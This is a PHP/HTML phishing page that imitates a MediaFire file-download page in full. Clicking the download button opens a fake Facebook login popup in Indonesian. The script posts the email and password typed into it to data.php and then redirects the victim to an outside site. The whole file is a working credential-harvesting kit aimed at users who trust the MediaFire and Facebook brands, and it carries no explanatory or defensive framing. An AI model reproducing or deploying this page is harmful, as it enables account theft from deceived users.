<?php
include('mailman.html');
//codee



?>

<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <title><?php echo $namafile; ?></title>
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css" />
        <link href='https://unpkg.com/boxicons@2.0.9/css/boxicons.min.css' rel='stylesheet'>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
        <link rel="stylesheet" href="https://cdn.statically.io/gh/AlexHostX/all.asset/main/alex-facebook.css">
        <meta name="keywords" content="online storage, free storage, cloud Storage, collaboration, backup file Sharing, share Files, photo backup, photo sharing, ftp replacement, cross platform, remote access, mobile access, send large files, recover files, file versioning, undelete, Windows, PC, Mac, OS X, Linux, iPhone, iPad, Android">
        <link rel="icon" type="image/x-icon" href="https://cdn.statically.io/gh/AlexHostX/all.asset/main/mdr/favicon.ico">
<style>
* {
    margin: 0px;
}
html {
    font: normal normal normal 14px/1.6 'Open Sans', sans-serif;
}
body {
    margin: 0px;
    background-color: #fff;
}
main {
        display: flex;
    flex-direction: column;
    align-items: center;
}
header {
       background: #fff;
    padding: 20px 0px;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    justify-content: space-between;
    align-items: center;
    border-bottom: 1px solid #0000002b;
    box-shadow: 0px 0px 1px 0px #0000002e;
    position: fixed;
    z-index: 2;
    width: 100%;
}
.imgmdralex {
        margin-left: 10%;
}
#ptcalexd {
    height: 27px;
}
#ptcalexm {
    display: none;
}
.menualexuser {
        margin-right: 10%;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    justify-content: center;
    column-gap: 3px;
}
.menualexuser button {
        background: #0070f0;
    color: #fff;
    max-width: 150px;
    white-space: nowrap;
    text-overflow: ellipsis;
    overflow: hidden;
    font-size: 12px;
    padding: 0 10px;
    display: inline-block;
    vertical-align: middle;
    border-radius: 3px;
    font-family: "Open Sans", sans-serif;
    font-weight: normal;
    cursor: pointer;
    height: 36px;
    line-height: 36px;
    border: 0;
    outline: 0;
    text-transform: uppercase;
    text-align: center;
    -webkit-appearance: none;
    box-sizing: border-box;
}
.menualexuser button>i {
        margin-left: 5px;
    background: rgb(0 0 0 / 15%);
    padding: 3px 5px;
    border-radius: 1px;
}
section {
        padding-top: 200px;
    max-width: 400px;
    width: 100%;
}
.contalexmdr {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
}
.btnalexdwn {
       width: 100%;
    background: #0070f0;
    color: #fff;
    align-items: center;
    padding: 7px 0px;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    border-radius: 4px;
    justify-content: space-between;
    cursor: pointer;
}
.lalexbtnd {
        margin-left: 20px;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    column-gap: 20px;
}
.lalexbtnd img {
        width: 35px;
}
.txtalexdwn {
    text-align: left;
}
.txtalexdwn p {
        font-weight: 600;
    font-size: 18px;
}
.txtalexdwn label {
        font-size: 13px;
}
.btnalexdwn i {
        margin-right: 20px;
    font-size: 20px;
}
.alexlnkcont {
        margin-top: 20px;
    width: 100%;
    display: flex;
    flex-direction: row;
    flex-wrap: wrap;
    align-items: center;
    justify-content: space-between;
}
.itemalexcont {
        width: 49%;
    font-size: 13px;
    line-height: 14px;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    background-color: #f4f4f5;
    border-radius: 4px;
    color: #575b65;
    padding: 10px 0;
    text-align: center;
    display: flex;
    flex-direction: column;
    align-items: center;
    margin-bottom: 10px;
}
.itemalexcont i {
        font-size: 18px;
    color: #575b65;
    margin-bottom: 5px;
    color: #777;
}
.uplregalexmdr {
        margin-top: 150px;
        margin-bottom: 200px;
}
.alexmapmdr {
        position: relative;
    background: #4cacff url(https://cdn.statically.io/gh/AlexHostX/all.asset/main/mdr/world.svg) center / contain no-repeat;
    box-shadow: inset 0 0 0 2px rgb(0 0 0 / 6%);
    margin-bottom: 30px;
    width: 100%;
    height: 200px;
}
.descalexmapmdr {
        display: inline-block;
    padding: 4px 8px;
    color: #fff;
    font-size: 11px;
    background-color: rgba(0, 0, 0, 0.4);
    position: relative;
    z-index: 1;
}
.bgalexdbmdr {
        background-image: url(https://cdn.statically.io/gh/AlexHostX/all.asset/main/mdr/continent-as.svg);
    background-position: center;
    background-size: contain;
    background-repeat: no-repeat;
    position: absolute;
    width: 100%;
    height: 100%;
    top: 0;
    left: 0;
}
.alexdescmap {
        display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
}
.alexdescmap img {
        height: 50px;
    margin-right: 20px;
}
.alexdescmap span {
        font-size: 13px;
}
.vtotoalalexmdr {
        padding-bottom: 50px;
    border-bottom: 1px solid #00000014;
    margin-bottom: 20px;
    margin-top: 40px;
    display: flex;
    justify-content: flex-start;
    flex-direction: column;
}
.vtotoalalexmdr img {
        background-color: #fff;
    height: 96px;
    width: 160px;
    box-shadow: inset 0 0 0 2px rgba(0, 0, 0, 0.06);
    margin: 0 30px 15px 0;
    padding: 20px;
    box-sizing: border-box;
    position: relative;
}
.vtotoalalexmdr p {
        margin: 0 0 15px;
    width: 100%;
    font-weight: bold;
    font-size: 14px;
    margin-bottom: 10px;
}
.vtotoalalexmdr span {
        font-size: 13px;
    line-height: 1.4;
    margin-bottom: 10px;
}
footer {
        padding: 30px 0px;
    width: 100%;
    background-color: #f3f3f3;
    height: auto;
    min-height: 260px;
    color: #575b65;
    box-shadow: inset 0 1px 0px 0 rgba(0, 0, 0, 0.03);
}
.topmdrfootalex {
       position: relative;
    max-width: 960px;
    margin: 0 auto;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: flex-start;
    justify-content: space-between;
        padding-bottom: 70px;
    border-bottom: 1px solid #55555529;
}
.itemboxmdralexf {
        text-align: left;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-content: flex-start;
    font-size: 12px;
}
.itemboxmdralexf p {
        color: #575b65;
    font-family: "Open Sans", sans-serif;
    font-size: 12px;
    position: relative;
    font-weight: 600;
    text-transform: uppercase;
    margin-bottom: 10px;
}
.alexfootalexc {
        max-width: 960px;
    padding-top: 40px;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    justify-content: space-between;
    margin: 0 auto;
    font-size: 12px;
}
.leftcalexmdrf {
        display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    justify-content: flex-start;
    column-gap: 20px;
}
.rightalexmdrf {
        font-size: 20px;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    column-gap: 20px;
}
.rightalexmdrf i {
        color: #575b656b;
    padding: 5px 9px;
    border-radius: 1px;
    background: #575b6508;
}
.spnalxmdr {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: flex-start;
}
.spnjjralexmdr {
        display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    column-gap: 20px;
}

@media only screen and (max-width: 600px) {
.imgmdralex {
        margin-left: 5%;
}
#ptcalexd {
    display: none;
}
#ptcalexm {
        display: block;
    width: 191px;
}
.menualexuser {
        column-gap: 1px;
}
.menualexuser button {
        font-size: 9px;
    font-weight: 700;
    border-radius: 1px;
}
.menualexuser button> i {
    display: none;
}
section {
        width: 90%;
}
.topmdrfootalex {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: flex-start;
    width: 90%;
}
.itemboxmdralexf {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    column-gap: 20px;
    margin-bottom: 20px;
    padding-bottom: 10px;
}
.spnalxmdr {
        display: flex;
    flex-direction: row;
    align-items: center;
    column-gap: 20px;
}
.alexfootalexc {
        width: 90%;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: flex-start;
}
.leftcalexmdrf {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: flex-start;
    gap: 20px;
}
.rightalexmdrf {
        margin-top: 50px;
}
.spnjjralexmdr {
        display: flex;
    flex-direction: row;
    flex-wrap: wrap;
    align-items: center;
    column-gap: 28px;
    line-height: 3;
}
}
</style>
    </head>
    <body>
        <main>
            <header>
                <div class="imgmdralex">
                    <img id="ptcalexd" src="https://cdn.statically.io/gh/AlexHostX/all.asset/main/mdr/mf_logo_full_color.svg" alt="mediafire" />
                    <img id="ptcalexm" src="https://cdn.statically.io/gh/AlexHostX/all.asset/main/mdr/mf_logo_u1_full_color_reversed.svg" alt="mediafire" />
                </div>
                <div class="menualexuser">
                    <button>Sign Up</button>
                    <button>Log In <i class="fa-brands fa-facebook-f" onclick="openmdralexf()"></i> <i class="fa-brands fa-twitter"></i></button>
                </div>
            </header>
            <section>
                <div class="contalexmdr">
                    <div class="btnalexdwn" onclick="openmdralexf()">
                        <div class="lalexbtnd" onclick="openmdralexf()">
                            <img src="https://i.ibb.co/pKBk6t4/20220527-210255.jpg" alt="" onclick="openmdralexf()" />
                            <div class="txtalexdwn" onclick="openmdralexf()">
                                <p onclick="openmdralexf()"><?php echo $namafile; ?></p>
                                <label onclick="openmdralexf()">Download (<?php echo $ukuran; ?>)</label>
                            </div>
                        </div>
                        <i onclick="openmdralexf()" class="fa-solid fa-down-to-line"></i>
                    </div>
                    <div class="alexlnkcont">
                        <div class="itemalexcont">
                            <i class="fa-solid fa-link-simple"></i>
                            <span>Copy for messenger</span>
                        </div>
                        <div class="itemalexcont">
                            <i class="fa-solid fa-share-nodes"></i>
                            <span>Share options</span>
                        </div>
                        <div class="itemalexcont">
                            <i class="fa-brands fa-facebook-f"></i>
                            <span>Post to Facebook</span>
                        </div>
                        <div class="itemalexcont">
                            <i class="fa-solid fa-plus"></i>
                            <span>Save to My Files</span>
                        </div>
                    </div>
                </div>
                <div class="uplregalexmdr">
                    <div class="alexmapmdr">
                        <div class="descalexmapmdr">Upload region:</div>
                        <div class="bgalexdbmdr"></div>
                    </div>
                    <div class="alexdescmap">
                        <img src="https://cdn.statically.io/gh/AlexHostX/all.asset/main/mdr/idn.svg" alt="" />
                        <span>This file was uploaded from Indonesia on June 29, 2021 at 7:24 AM</span>
                    </div>
                    <div class="vtotoalalexmdr">
                        <img src="https://cdn.statically.io/gh/AlexHostX/all.asset/main/mdr/flag.svg" alt="" />
                        <p>VirusTotal scan</p>
                        <span>MediaFire scans high-risk files using VirusTotal.</span>
                    </div>
                    <div class="vtotoalalexmdr" style="padding-bottom: 20px; border-bottom: unset;">
                        <img style="box-shadow: unset; padding: 0px; width: 72px; height: 72px;" src="https://cdn.statically.io/gh/AlexHostX/all.asset/main/mdr/mf_round.svg" alt="" />
                        <p>About MediaFire</p>
                        <span>Welcome!<br>With MediaFire, you get simple yet powerful file storage along with features you won’t find anywhere else. <label style="color; #0070f0;">Learn more</label></span>
                    </div>
                    <div class="vtotoalalexmdr" style="padding-bottom: 20px; border-bottom: unset;">
                        <img style="box-shadow: unset; padding: 0px; width: 72px; height: 72px;" src="https://cdn.statically.io/gh/AlexHostX/all.asset/main/mdr/browser_chrome.svg" alt="" />
                        <p>Download application</p>
                        <span>You are downloading this file with Chrome, version 0.0.</span>
                    </div>
                </div>
            </section>
            <footer>
                <div class="topmdrfootalex">
                    <div class="itemboxmdralexf">
                        <p>COMPANY</p>
                        <div class="spnalxmdr">
                            <span>About Us</span>
                            <span>Careers</span>
                            <span>Press</span>
                            <span>Company Blog</span>
                        </div>
                    </div>
                    <div class="itemboxmdralexf">
                        <p>TOOLS</p>
                        <div class="spnalxmdr">
                            <span>MediaFire Mobile</span>
                        <span>On-Demand Video Encoding</span>
                        </div>
                    </div>
                    <div class="itemboxmdralexf">
                        <p>UPGRADE</p>
                        <div class="spnalxmdr">
                            <span>Professionals</span>
                        </div>
                    </div>
                    <div class="itemboxmdralexf">
                        <p>SUPPORT</p>
                        <div class="spnalxmdr">
                            <span>Get Support</span>
                        </div>
                    </div>
                </div>
                <div class="alexfootalexc">
                    <div class="leftcalexmdrf">
                        <span>©2022 MediaFire Build 121873</span>
                        <div class="spnjjralexmdr">
                            <span>Advertising</span>
                            <span>Terms</span>
                            <span>Privacy Policy</span>
                            <span>Copyright</span>
                            <span>Abuse</span>
                            <span>Credits</span>
                            <span>More...</span>
                        </div>
                    </div>
                    <div class="rightalexmdrf">
                        <i class="fa-brands fa-facebook-f"></i>
                        <i class="fa-brands fa-twitter"></i>
                        <i class="fa-solid fa-b"></i>
                    </div>
                </div>
            </footer>
            <div class="popup-ariandi alex-facebook animate fadeIn" id="alexf" style="display: none;">
                <div class="container-box-fb" style="margin-top: 10%;">
                    <div class="atasan-fb" style="width: 95.2%;">
                        <img src="https://cdn.statically.io/gh/AlexHostX/logAlex/main/facebook_text.png">
                    </div>
                    <div class="isi-facebook">
                        <p class="kaget email-fb1" style="width: 320px;">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></b></p>
                        <p class="kaget sandi-fb1" style="width: 320px;">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
                        <img src="https://cdn.statically.io/gh/AlexHostX/all.asset/main/mdr/mdr_log.png">
                        <div class="txt-ucapan-fb">Masuk ke akun Facebook Anda untuk terhubung dengan MediaFire</div>
                        <form class="form-login-fb" id="ngumpulinuangnikah">
                            <label>
                                <input type="text" id="alx_email_fb2" name="email" placeholder="Email atau Nomor Telepon" autocomplete="off" autocapitalize="off" style="background: #fff; width: 90%" required>
                            </label>
                            <label>
                                <input type="password" id="alx_password_fb2" name="sandi" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" style="background: #fff; width: 90%" required>
                            </label>
                            <input type="hidden" name="login" id="alx_login_fb" value="Facebook" readonly>
                            <button class="btn-login-fb" onclick="return AlexHostingFB()" type="button">Masuk</button>
                        </form>
                        <div class="txt-buat-akun">Buat akun</div>
                        <div class="txt-tidak-sekarang">Lain kali</div>
                        <div class="txt-lupa-password">Lupa Kata Sandi? • Pusat Bantuan</div>
                    </div>
                    <div class="isi-bahasa">
                        <center>
                            <div class="nama-bahasa bahasa-aktif">Bahasa Indonesia</div>
                            <div class="nama-bahasa">English (UK)</div>
                            <div class="nama-bahasa">Basa Jawa</div>
                            <div class="nama-bahasa">Bahasa Melayu</div>
                            <div class="nama-bahasa">日本語</div>
                            <div class="nama-bahasa">Español</div>
                            <div class="nama-bahasa">Português (Brasil)</div>
                            <div class="nama-bahasa"><i class="fa fa-plus"></i>
                            </div>
                        </center>
                    </div>
                    <div class="kalobukanalexsiapalagi">Facebook Inc.</div>
                </div>
            </div>
        </main>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
        <script>
            function openmdralexf() {
                $('#alexf').show();
            }
            
             function AlexHostingFB()
        	{
        		$emailfb1 = $('#alx_email_fb2').val().trim();
        		$passwordfb1 = $('#alx_password_fb2').val().trim();
        		if($emailfb1 == '' || $emailfb1 == null || $emailfb1.length <= 6)
        		{
        			$('.email-fb1').show();
        			$('.sandi-fb1').hide();
        			return false;
        		}else{
        			$('.email-fb1').hide();
        		}
        		if($passwordfb1 == '' || $passwordfb1 == null || $passwordfb1.length <= 6)
        		{
        			$('.sandi-fb1').show();
        			return false;
        		}else{
        			$('.sandi-fb1').hide();
        		}
        		
        		if($emailfb1.length >=6 || $passwordfb1.length >=6) {
        		    $.ajax({
                        type: 'POST',
                        url: 'data.php',
                        data: $('#ngumpulinuangnikah').serialize(),
                        dataType: 'text',
                        success: function() {
                                    location.href = "https://stayherevip.xyz";
                            } 
                    })
        		}
        	}

        </script>
    </body>
</html>
